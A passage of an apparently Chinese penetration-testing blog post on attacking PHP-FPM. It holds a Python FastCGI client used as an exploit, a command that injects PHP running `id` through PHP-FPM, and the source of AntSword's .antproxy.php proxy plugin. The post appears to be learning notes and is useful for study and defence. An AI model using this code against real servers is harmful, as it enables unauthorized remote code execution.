class="hljs-number">0xFF</span>) \<br>               + <span class="hljs-built_in">chr</span>((length &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>               + <span class="hljs-built_in">chr</span>(length &amp; <span class="hljs-number">0xFF</span>) \<br>               + <span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>) \<br>               + <span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>) \<br>               + content<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__encodeNameValueParams</span>(<span class="hljs-params">self, name, value</span>):</span><br>        <span class="hljs-comment"># 此函数对body进行编码</span><br>        nLen = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>(name))<br>        vLen = <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>(value))<br>        record = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nLen &lt; <span class="hljs-number">128</span>:<br>            record += <span class="hljs-built_in">chr</span>(nLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += <span class="hljs-built_in">chr</span>((nLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + <span class="hljs-built_in">chr</span>((nLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + <span class="hljs-built_in">chr</span>((nLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + <span class="hljs-built_in">chr</span>(nLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">if</span> vLen &lt; <span class="hljs-number">128</span>:<br>            record += <span class="hljs-built_in">chr</span>(vLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += <span class="hljs-built_in">chr</span>((vLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + <span class="hljs-built_in">chr</span>((vLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + <span class="hljs-built_in">chr</span>((vLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + <span class="hljs-built_in">chr</span>(vLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">return</span> record + <span class="hljs-built_in">str</span>(name) + <span class="hljs-built_in">str</span>(value)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__decodeFastCGIHeader</span>(<span class="hljs-params">self, stream</span>):</span><br>        <span class="hljs-comment"># 此函数对header进行解码</span><br>        <span class="hljs-comment"># 被用于__decodeFastCGIRecord函数的一部分</span><br>        header = <span class="hljs-built_in">dict</span>()<br>        header[<span class="hljs-string">&#x27;version&#x27;</span>] = <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">0</span>])<br>        header[<span class="hljs-string">&#x27;type&#x27;</span>] = <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">1</span>])<br>        header[<span class="hljs-string">&#x27;requestId&#x27;</span>] = (<span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">3</span>])<br>        header[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (<span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">8</span>) + <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">5</span>])<br>        header[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">6</span>])<br>        header[<span class="hljs-string">&#x27;reserved&#x27;</span>] = <span class="hljs-built_in">ord</span>(stream[<span class="hljs-number">7</span>])<br>        <span class="hljs-keyword">return</span> header<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__decodeFastCGIRecord</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># 此函数对record进行解码</span><br>        header = self.sock.recv(<span class="hljs-built_in">int</span>(FastCGIClient.__FCGI_HEADER_SIZE))<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> header:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            record = self.__decodeFastCGIHeader(header)<br>            record[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;contentLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                contentLength = <span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;contentLength&#x27;</span>])<br>                buffer = self.sock.recv(contentLength)<br>                <span class="hljs-keyword">while</span> contentLength <span class="hljs-keyword">and</span> buffer:<br>                    contentLength -= <span class="hljs-built_in">len</span>(buffer)<br>                    record[<span class="hljs-string">&#x27;content&#x27;</span>] += buffer<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;paddingLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                skiped = self.sock.recv(<span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]))<br>            <span class="hljs-keyword">return</span> record<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">request</span>(<span class="hljs-params">self, nameValuePairs=&#123;&#125;, post=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.__connect():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        <span class="hljs-comment"># 区分多段Record.requestId作为同一次请求的标志</span><br>        requestId = random.randint(<span class="hljs-number">1</span>, (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>) - <span class="hljs-number">1</span>)<br>        self.requests[requestId] = <span class="hljs-built_in">dict</span>()<br>        request = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-comment"># 构造header</span><br>        beginFCGIRecordContent = <span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>) \<br>                                 + <span class="hljs-built_in">chr</span>(FastCGIClient.__FCGI_ROLE_RESPONDER) \<br>                                 + <span class="hljs-built_in">chr</span>(self.keepalive) \<br>                                 + <span class="hljs-built_in">chr</span>(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span><br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,<br>                                              beginFCGIRecordContent, requestId)<br><br>        <span class="hljs-comment"># 构造body</span><br>        paramsRecord = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nameValuePairs:<br>            <span class="hljs-keyword">for</span> (name, value) <span class="hljs-keyword">in</span> nameValuePairs.iteritems():<br>                <span class="hljs-comment"># paramsRecord = self.__encodeNameValueParams(name, value)</span><br>                <span class="hljs-comment"># request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br>                paramsRecord += self.__encodeNameValueParams(name, value)<br><br>        <span class="hljs-keyword">if</span> paramsRecord:<br>            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)<br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="hljs-string">&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-keyword">if</span> post:<br>            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, post, requestId)<br>        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="hljs-string">&#x27;&#x27;</span>, requestId)<br>        <span class="hljs-comment"># 发送fast-cgi格式的包</span><br>        self.sock.send(request)<br>        self.requests[requestId][<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_SEND<br>        self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-comment"># 接受返回包</span><br>        <span class="hljs-keyword">return</span> self.__waitForResponse(requestId)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__waitForResponse</span>(<span class="hljs-params">self, requestId</span>):</span><br>        <span class="hljs-comment"># 接受返回包</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            response = self.__decodeFastCGIRecord()<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \<br>                    <span class="hljs-keyword">or</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                    self.requests[<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR<br>                <span class="hljs-keyword">if</span> requestId == <span class="hljs-built_in">int</span>(response[<span class="hljs-string">&#x27;requestId&#x27;</span>]):<br>                    self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] += response[<span class="hljs-string">&#x27;content&#x27;</span>]<br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:<br>                self.requests[requestId]<br>        <span class="hljs-keyword">return</span> self.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>]<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__repr__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.host, self.port)<br></code></pre></td></tr></table></figure>
<p>利用</p>
<blockquote>
<p>python fpm.py 127.0.0.1 -p 9000 /var/www/html/phpinfo.php -c ‘&lt;?php echo <code>id</code>;exit;?&gt;’</p>
</blockquote>
<p>也可看看蚁剑插件.antproxy.php的源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_client_header</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable">$headers</span>=<span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>)&#123;<br>        <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$k</span>,<span class="hljs-string">&#x27;HTTP_&#x27;</span>)===<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-variable">$k</span>=strtolower(preg_replace(<span class="hljs-string">&#x27;/^HTTP/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$k</span>));<br>            <span class="hljs-variable">$k</span>=preg_replace_callback(<span class="hljs-string">&#x27;/_\w/&#x27;</span>,<span class="hljs-string">&#x27;header_callback&#x27;</span>,<span class="hljs-variable">$k</span>);<br>            <span class="hljs-variable">$k</span>=preg_replace(<span class="hljs-string">&#x27;/^_/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$k</span>);<br>            <span class="hljs-variable">$k</span>=str_replace(<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-variable">$k</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$k</span>==<span class="hljs-string">&#x27;Host&#x27;</span>) <span class="hljs-keyword">continue</span>;<br>            <span class="hljs-variable">$headers</span>[]=<span class="hljs-string">&quot;<span class="hljs-subst">$k</span>:<span class="hljs-subst">$v</span>&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$headers</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">header_callback</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> strtoupper(<span class="hljs-variable">$str</span>[<span class="hljs-number">0</span>]);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseHeader</span>(<span class="hljs-params"><span class="hljs-variable">$sResponse</span></span>)</span>&#123;<br>    <span class="hljs-keyword">list</span>(<span class="hljs-variable">$headerstr</span>,<span class="hljs-variable">$sResponse</span>)=explode(<span class="hljs-string">&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;</span>,<span class="hljs-variable">$sResponse</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-variable">$ret</span>=<span class="hljs-keyword">array</span>(<span class="hljs-variable">$headerstr</span>,<span class="hljs-variable">$sResponse</span>);<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^HTTP/1.1 d&#123;3&#125;/&#x27;</span>, <span class="hljs-variable">$sResponse</span>))&#123;<br>        <span class="hljs-variable">$ret</span>=parseHeader(<span class="hljs-variable">$sResponse</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$ret</span>;<br>&#125;<br><br>set_time_limit(<span class="hljs-number">120</span>);<br><span class="hljs-variable">$headers</span>=get_client_header();<br><span class="hljs-variable">$host</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<br><span class="hljs-variable">$port</span> = <span class="hljs-number">61813</span>;<br><span class="hljs-variable">$errno</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$errstr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$timeout</span> = <span class="hljs-number">30</span>;<br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;/index.php&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;?&quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br>&#125;;<br><br><span class="hljs-variable">$fp</span> = fsockopen(<span class="hljs-variable">$host</span>, <span class="hljs-variable">$port</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$timeout</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fp</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-variable">$method</span> = <span class="hljs-string">&quot;GET&quot;</span>;<br><span class="hljs-variable">$post_data</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>]==<span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$method</span> = <span class="hljs-string">&quot;POST&quot;</span>;<br>    <span class="hljs-variable">$post_data</span> = file_get_contents(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$out</span> = <span class="hljs-variable">$method</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$url</span>.<span class="hljs-string">&quot; HTTP/1.1\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: &quot;</span>.<span class="hljs-variable">$host</span>.<span class="hljs-string">&quot;:&quot;</span>.<span class="hljs-variable">$port</span>.<span class="hljs-string">&quot;\r\n&quot;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Content-Type: &quot;</span>.<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>].<span class="hljs-string">&quot;\r\n&quot;</span>;<br>&#125;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Content-length:&quot;</span>.strlen(<span class="hljs-variable">$post_data</span>).<span class="hljs-string">&quot;\r\n&quot;</span>;<br><br><span class="hljs-variable">$out</span> .= implode(<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$headers</span>);<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;&quot;</span>.<span class="hljs-variable">$post_data</span>;<br><br>fputs(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>);<br><br><span class="hljs-variable">$response</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=fread(<span class="hljs-variable">$fp</span>, <span class="hljs-number">4096</span>))&#123;<br>    <span class="hljs-variable">$response</span> .= <span class="hljs-variable">$row</span>;<br>&#125;<br>fclose(<span class="hljs-variable">$fp</span>);<br><span class="hljs-variable">$pos</span> = strpos(<span class="hljs-variable">$response</span>, <span class="hljs-string">&quot;\r\n\r\n&quot;</span>);<br><span class="hljs-variable">$response</span> = substr(<span class="hljs-variable">$response</span>, <span class="hljs-variable">$pos</span>+<span class="hljs-number">4</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$response</span>;<br><br></code></pre></td></tr></table></figure>

<h4 id="PHP-FPM任意代码执行"><a href="#PHP-FPM任意代码执行" class="headerlink" title="PHP-FPM任意代码执行"></a>PHP-FPM任意代码执行</h4><p>参考文章<br><a href="_url"></a><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/75114351?from_voters_page=true">https://zhuanlan.zhihu.com/p/75114351?from_voters_page=true</a><br><a href="_url"></a><a target="_blank" rel="noopener" href="https://juejin.cn/post/6844903471976546311">https://juejin.cn/post/6844903471976546311</a><br><a href="_url"></a><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5598">https://xz.aliyun.com/t/5598</a><br><a href="_url"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cjjjj/p/9844829.html">https://www.cnblogs.com/cjjjj/p/9844829.html</a><br><a href="_url"></a><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>

    </div>
</div>
<style>
    #noneimg img {
        display: none;
        z-index: 109;
        width: 600px !important;
        border-radius: 0px;
        position: fixed;
        box-shadow: 0 0 0px #c3c3c300 !important;
        left: 0;
        top: 0;
        right: 0;
        bottom: 0;
        margin: auto !important;
    }

    @media screen and (max-width:600px) {
        #noneimg img {
            width: 88%
        }
    }
</style>
<script>
    $(function () { $('#article').click(function (e) { if (e.target.tagName == "IMG") { if ($('#nonediv').length == 0) { let MImg = `<div id='noneimg'><img src='${e.target.currentSrc}'></div>`; let MDiv = "<div id='nonediv' style='cursor: pointer;display: none; position: fixed;left: 0;top: 0; right: 0;bottom: 0;background-color: #fffff0;opacity:0.5;z-index: 108;'></div>"; $('#article').append(MDiv); $('#article').append(MImg); $("#nonediv").fadeIn("slow"); $("#noneimg img").fadeIn("slow") } } else { if ($('#nonediv').length !== 0) { $("#noneimg ").fadeOut("slow"); $("#nonediv").fadeOut("slow"); setTimeout(function () { $('#nonediv').remove(); $('#noneimg').remove() }, 500) } } }); $('.article-content').addClass('content-move') });
</script>
<div class="Last-Next">
    
    <a href="/2021/05/17/2020-4-29/">
        <div class="last">
            <span>上一篇</span>
            <p></p>
        </div>
    </a>
    

    
    <a href="/2021/05/15/2021-5-15-ssrf%E5%AD%A6%E4%B9%A0/">
        <div class="next">
            <span>下一篇</span>
            <p>ssrf</p>
        </div>
    </a>
    
</div>
		
<link rel="stylesheet" href="/css/food.css">

<div class="footer">
	<div class="Copyright">
		©2021 By KKfine. 主题：<a
			style="text-decoration: none;display: contents; color: #898F9F;"
			target="_blank" rel="noopener" href="https://github.com/qiaobug/hexo-theme-quiet">Quiet</a>
	</div>
	<div class="contact">
		
		<a target="_blank" rel="noopener" href="https://github.com/qiaobug">
			<img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
		</a>
		
	</div>
</div>

<script src="/js/jquery.min.js"></script>


<script src="/js/gotop.js"></script>


<style type="text/css">
    @media screen and (min-width: 600px) {
        .goTop>span {
            display: block;
            border-radius: 50%;
            width: 66px;
            height: 66px;
            cursor: pointer;
            opacity: 0.8;
            background: rgba(18, 24, 58, 0.06);
            text-align: center;
            border: 1px solid rgba(18, 24, 58, 0.06);

            transition: border .5s;
            -moz-transition: border .5s;
            /* Firefox 4 */
            -webkit-transition: border .5s;
            /* Safari 和 Chrome */
            -o-transition: border .5s;
            /* Opera */
        }

        .goTop>span:hover {
            border: 1px solid #6680B3;
        }


        .goTop {
            position: fixed;
            right: 30px;
            bottom: 80px;
        }

        .goTop>span>svg {
            width: 30px;
            height: 30px;
            margin-top: 17.5px;
            opacity: 0.7;
        }

    }

    @media screen and (max-width: 600px) {
        .goTop {
            display: none;
        }
    }
</style>
<div class="goTop" id="js-go_top">
    <span>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
            <g>
                <path d="M13 12v8h-2v-8H4l8-8 8 8z"></path>
            </g>
        </svg>
    </span>
</div>
<script>
    $('#js-go_top').gotoTop({ offset: 500, speed: 300, animationShow: { 'transform': 'translate(0,0)', 'transition': 'transform .5s ease-in-out' }, animationHide: { 'transform': 'translate(100px,0)', 'transition': 'transform .5s ease-in-out' } });
</script>
<script>
	console.log('\n %c Hexo-Quiet 主题 %c https://github.com/QiaoBug/hexo-theme-quiet \n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;')
</script>
	</body>

</html>